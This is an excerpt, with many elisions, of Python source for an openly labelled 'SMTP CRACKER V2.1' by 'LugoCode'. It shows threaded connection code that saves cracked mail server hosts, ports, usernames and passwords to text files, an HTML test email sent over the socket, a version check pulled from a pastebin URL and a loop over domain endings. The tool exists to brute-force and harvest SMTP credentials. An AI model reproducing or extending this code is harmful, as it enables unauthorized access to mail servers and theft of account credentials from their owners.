...
class consumer(threading.Thread):
	...
	def connect(self,tupple,ssl=False):
		...
		try:
			...
			save=open('Smtp-Already','a').write(host+":"+port+","+user+","+passw+"\n")
			save=open('Smtp_Mailaccess.txt','a').write(user+":"+passw+"\n")
...
<body>
	<center>
		...
		<font color="#f16f6f"><h1>[ ! ]Developped by LugoCode [ ! ]</h1></font><br><br><br>
		...
		<font color="black" size="5" ><font color="red">Email :</font> lugocodeof@gmail <br><br></font>
		<h2>© LugoCode</h2>
	</body>
	</html>\r\n.\r\n'''
			s.send(headers)
...
cracked=[]
rbads=0
vers=requests.get('https://pastebin.com/raw/KBrXuYc9').text.encode('utf-8')
print('''       \033[91m[\033[92m+\033[91m]\033[1m(C)opyright >  LugoCode [\033[92m+\033[91m]
              \033[91m[\033[92m+\033[91m]\033[95m SMTP CRACKER V2.1 DEVELOPED BY LUGOCODE \033[91m[\033[92m+\033[91m]
             \033[91m[\033[92m+\033[91m]\033[92m     Email : lugocodeof@gmail.com    \033[91m[\033[92m+\033[91m]
           \033[91m[\033[92m+\033[91m]   Youtube > LugoCode  \033[91m[\033[92m+\033[91m]''')
...
email=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Press Enter \033[97m ')
thret=200
def part():
	global tld,tlds
	for i in tld:
